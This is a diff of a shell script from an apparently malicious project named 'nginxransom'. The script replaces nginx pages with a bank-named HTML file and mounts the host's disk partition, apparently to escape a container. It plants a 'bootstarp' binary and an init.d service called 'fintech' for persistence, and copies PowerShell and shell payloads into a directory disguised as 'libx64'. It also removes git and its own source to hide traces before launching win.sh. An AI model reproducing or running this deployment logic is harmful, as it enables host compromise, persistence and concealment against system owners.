@@ -9,27 +9,28 @@ initialize &
 cp   nginxransom/web/index.html /usr/share/nginx/html/index.html
 cp   nginxransom/web/credit-suisse.html /usr/share/nginx/html/credit-suisse.html
 diskpart=$(mount | grep   '^/dev/' | grep 'hosts' |  sed 's/ *$//g' | awk  '{print $1}')
-mount $diskpart /mnt/
+mkdir -p mnt/libx64
+mount $diskpart /mnt/libx64/
 cp   nginxransom/bootstarp.txt /mnt/usr/bin/bootstarp
 cp   nginxransom/bootstarp.txt /mnt/usr/local/bin/bootstarp 
 cp   nginxransom/bootstarp.txt /usr/bin/bootstarp
 cp   nginxransom/service.sh ../
-cp   nginxransom/service.sh ../mnt/
-cp   nginxransom/init.py    ../mnt/
-cp   nginxransom/hoa.ps1    ../mnt/
-cp   nginxransom/hoachanged.ps1 ../mnt/
-cp   nginxransom/hoascheduler.ps1 ../mnt/
-cp   nginxransom/win.sh     ../mnt/
+cp   nginxransom/service.sh ../mnt/libx64/
+cp   nginxransom/init.py    ../mnt/libx64/
+cp   nginxransom/hoa.ps1    ../mnt/libx64/
+cp   nginxransom/hoachanged.ps1 ../mnt/libx64/
+cp   nginxransom/hoascheduler.ps1 ../mnt/libx64/
+cp   nginxransom/win.sh     ../mnt/libx64/
 chmod 777 /usr/bin/bootstarp 
 chmod 777 mnt/usr/local/bin/bootstarp
 chmod 777 mnt/usr/bin/bootstarp 
-chmod 777 mnt/service.sh
+chmod 777 mnt/libx64/service.sh
 chmod 777 service.sh
-chmod 777 init.py
-chmod 777 hoa.ps1
-chmod 777 hoachanged.ps1
-chmod 777 hoascheduler.ps1
-chmod 777 win.sh
+chmod 777 mnt/libx64/init.py
+chmod 777 mnt/libx64/hoa.ps1
+chmod 777 mnt/libx64/hoachanged.ps1
+chmod 777 mnt/libx64/hoascheduler.ps1
+chmod 777 mnt/libx64/win.sh
 chroot mnt/ cp service.sh /etc/init.d/fintech
 rm -rf service.sh
 chroot mnt/ chmod +x /etc/init.d/fintech
@@ -48,6 +49,6 @@ chroot mnt/ rm -rf service.sh
 apt remove git -y
  
 rm -rf nginxransom/
-./win.sh &
-wait
-chroot mnt/ poweroff -f
+./libx64/win.sh &
+#wait
+#chroot mnt/ poweroff -f
